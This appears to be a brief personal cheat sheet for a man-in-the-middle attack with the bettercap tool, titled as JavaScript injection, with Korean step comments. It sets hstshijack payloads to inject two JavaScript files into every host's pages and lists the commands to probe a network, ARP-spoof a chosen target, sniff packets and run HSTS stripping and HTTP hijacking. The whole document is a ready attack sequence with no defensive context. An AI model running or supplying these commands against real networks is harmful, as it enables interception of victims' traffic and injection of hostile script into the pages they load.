# hacking Javascript Injection

## hstshijack.cap

```sh
set hstshijack.payloads *:/injection1.js, *:/injection2.js
```

## usage

```sh
bettercap -iface eth0

net.probe on
net.show

set arp.spoof.fullduplex true
set arp.spoof.targets [target ip]

arp.spoof on # ARP Spoofing 시작
net.sniff on # 패킷 스니핑 시작

hstshijack/hstshijack # HTTP Host Hijacking
```
